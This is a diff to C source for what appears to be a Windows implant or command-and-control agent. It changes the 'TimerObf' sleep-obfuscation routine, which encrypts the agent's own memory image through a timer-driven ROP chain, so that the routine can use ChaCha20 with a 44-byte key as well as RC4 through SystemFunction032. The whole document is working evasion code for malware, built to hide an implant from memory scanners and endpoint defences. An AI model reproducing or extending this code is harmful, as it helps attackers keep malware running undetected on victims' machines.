@@ -26,7 +26,7 @@ BOOL TimerObf(
     HANDLE   EvntTimer = { 0 };
     HANDLE   EvntDelay = { 0 };
     HANDLE   EvntWait  = { 0 };
-    UCHAR    Buf[ 16 ] = { 0 };
+    UCHAR    Buf[ 44 ] = { 0 };  /* max for ChaCha20: 32-byte key + 12-byte nonce */
     USTRING  Key       = { 0 };
     USTRING  Img       = { 0 };
     PVOID    ImgBase   = { 0 };
@@ -73,9 +73,10 @@ BOOL TimerObf(
         PUTS( "TimerObf: using full image (no .text section info)" )
     }
 
-    /* create a random key */
-    for ( BYTE i = 0; i < 16; i++ ) {
-        Buf[ i ] = RandomNumber32( );
+    /* create a random key; length depends on cipher: 16 bytes for RC4, 44 bytes for ChaCha20 */
+    DWORD KeyLen = ( Instance->Config.Implant.SleepCipher == SLEEP_CIPHER_CHACHA20 ) ? 44 : 16;
+    for ( DWORD i = 0; i < KeyLen; i++ ) {
+        Buf[ i ] = (UCHAR)RandomNumber32();
     }
 
     /* set specific context flags */
@@ -83,7 +84,7 @@ BOOL TimerObf(
 
     /* set key pointer and size */
     Key.Buffer = Buf;
-    Key.Length = Key.MaximumLength = sizeof( Buf );
+    Key.Length = Key.MaximumLength = (WORD)KeyLen;
 
     /* set agent memory pointer and size */
     Img.Buffer = ImgBase           = Instance->Session.ModuleBase;
@@ -207,9 +208,9 @@ BOOL TimerObf(
                     }
 
                     /* pre-flight: print all Win32 pointers used in the ROP chain so NULL is obvious */
-                    PRINTF( "TimerObf: fn-ptr WaitForSingleObjectEx=%p VirtualProtect=%p SystemFunction032=%p NtSetEvent=%p NtContinue=%p\n",
+                    PRINTF( "TimerObf: fn-ptr WaitForSingleObjectEx=%p VirtualProtect=%p SleepCipherFunc=%p NtSetEvent=%p NtContinue=%p\n",
                             Instance->Win32.WaitForSingleObjectEx, Instance->Win32.VirtualProtect,
-                            Instance->Win32.SystemFunction032, Instance->Win32.NtSetEvent,
+                            Instance->Win32.SleepCipherFunc, Instance->Win32.NtSetEvent,
                             Instance->Win32.NtContinue )
                     if ( Instance->Config.Implant.StackSpoof ) {
                         PRINTF( "TimerObf: fn-ptr NtGetContextThread=%p RtlCopyMappedMemory=%p NtSetContextThread=%p ThdSrc=%p\n",
@@ -240,7 +241,7 @@ BOOL TimerObf(
                     Inc++;
 
                     /* Encrypt image base address */
-                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 );
+                    OBF_JMP( Inc, Instance->Win32.SleepCipherFunc );
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
@@ -291,8 +292,8 @@ BOOL TimerObf(
                         Inc++;
                     }
 
-                    /* Sys032 */
-                    OBF_JMP( Inc, Instance->Win32.SystemFunction032 )
+                    /* Decrypt image */
+                    OBF_JMP( Inc, Instance->Win32.SleepCipherFunc )
                     Rop[ Inc ].Rcx = U_PTR( &Img );
                     Rop[ Inc ].Rdx = U_PTR( &Key );
                     Inc++;
